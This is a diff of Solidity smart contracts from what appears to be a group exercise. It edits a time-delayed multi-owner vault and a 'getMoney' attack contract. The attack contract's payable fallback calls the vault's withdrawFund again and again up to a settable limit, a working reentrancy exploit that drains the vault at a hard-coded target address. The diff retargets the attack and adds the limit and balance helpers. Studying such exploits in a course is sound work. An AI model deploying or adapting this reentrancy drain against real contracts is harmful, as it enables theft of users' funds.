@@ -116,11 +116,11 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
     function TimeDelayedVault() recordAction {
         nextWithdrawTime = now;
         withdrawCoolDownTime = 2 hours;
-        this.call(bytes4(sha3("initializeVault()")));
+        //this.call(bytes4(sha3("initializeVault()")));
        
         // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
-        authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c); //second
-        authorizedUsers.push(0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db);//third
+        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
+        authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
 
 
         for(uint i=0; i<authorizedUsers.length; i++) {
@@ -135,6 +135,12 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
         nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
         return res;
     }
+    function theBalance () returns (uint){
+        return this.balance;
+    }
+    function refreshWithdrawTime() {
+        nextWithdrawTime = now;
+    }
 }
 
 contract hackOthers {
@@ -148,24 +154,36 @@ contract hackOthers {
 }
 
 contract getMoney{
-    address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
+    //address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
+    address ct_addr = 0x9dd1e8169e76a9226b07ab9f85cc20a5e1ed44dd;
     uint count = 0;
+    uint limit = 1;
+    
     TimeDelayedVault ct = TimeDelayedVault(ct_addr);
     function addObserver(){
        ct.setObserver(this);    
-    }
-    function checkObserver() returns (bool){
-        return ct_addr == ct.withdrawObserver();
     }
     function hack(){ // need checkObserver first
          ct.withdrawFund(this);
     }
     function () payable {
-        if(count<=1000){
+        if(count<=limit ){
+            count += 1;
             ct.withdrawFund(this);
         }else{
             count = 0;
         }
     }
+    function theBalance () returns (uint){
+        return this.balance;
+    }
+    function setLimit(uint _limit) returns (uint){
+        limit = _limit;
+        return limit;
+    }
+    function observe() returns (bool){
+        return true;
+    }
+    
 }
 
